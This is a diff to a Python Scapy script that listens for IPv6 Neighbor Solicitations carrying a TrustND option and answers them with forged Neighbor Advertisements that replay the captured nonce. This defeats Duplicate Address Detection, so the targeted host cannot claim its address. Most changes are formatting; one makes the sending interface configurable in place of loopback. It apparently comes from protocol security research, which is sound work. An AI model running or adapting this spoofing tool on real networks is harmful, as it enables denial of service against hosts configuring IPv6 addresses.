@@ -3,11 +3,15 @@ from scapy.all import *
 import random
 import hashlib
 
+
 class DadReply:
-    flag=True
-    nonce=""
-    i=0
-    trustND=''
+    flag = True
+    nonce = ""
+    i = 0
+    trustND = ''
+
+    def __init__(self, iface):
+        self.iface = iface
 
     def parseIp(self, ip):
         self.strIP = ip.replace(":", "")
@@ -16,7 +20,7 @@ class DadReply:
         print(self.snma, self.strIP, self.suffix)
         return [self.snma, self.strIP, self.suffix]
 
-    def sendNa(self,ip):
+    def sendNa(self, ip):
 
         snma, ipWithoutColon, suffix = self.parseIp(ip)
 
@@ -28,16 +32,15 @@ class DadReply:
         self.timestamp = trustND.timestamp = int(time.time())
         trustND.nonce = int(self.nonce)
 
-        auth = self.hashSha1(l3/na/trustND)
+        auth = self.hashSha1(l3 / na / trustND)
 
         trustND.auth = auth
 
         print("sending NA packet with DADmatch option")
-        p = l2/l3/na/trustND
+        p = l2 / l3 / na / trustND
 
         p.display()
-        sendp(p, iface="lo")
-
+        sendp(p, iface=self.iface)
 
     def verifingNS(self, packet):
         if IPv6 in packet[0][1]:
@@ -45,19 +48,18 @@ class DadReply:
             if ICMPv6ND_NS in ipv6:
                 ns = ipv6[ICMPv6ND_NS]
                 if ICMPv6NDOptTrustND in ns:
-                    self.i=self.i+1
+                    self.i = self.i + 1
                     if self.i % 2 == 0: return 0
                     trustND = ns[ICMPv6NDOptTrustND]
                     self.nonce = trustND.nonce
-                    self.ip= ns.tgt
+                    self.ip = ns.tgt
                     print("attack")
                     self.flag = False
                     self.sendNa(self.ip)
                 else:
                     print("Received DAD but it does not has trust ND tag option")
 
-
-    def hashSha1(self,p):
+    def hashSha1(self, p):
         sha1 = hashlib.sha1()
         sha1.update(str(p))
         hash = sha1.hexdigest()
@@ -67,4 +69,3 @@ class DadReply:
     def sniffingAndReply(self):
         print("Replay DAD is starting")
         sniff(prn=self.verifingNS)
-
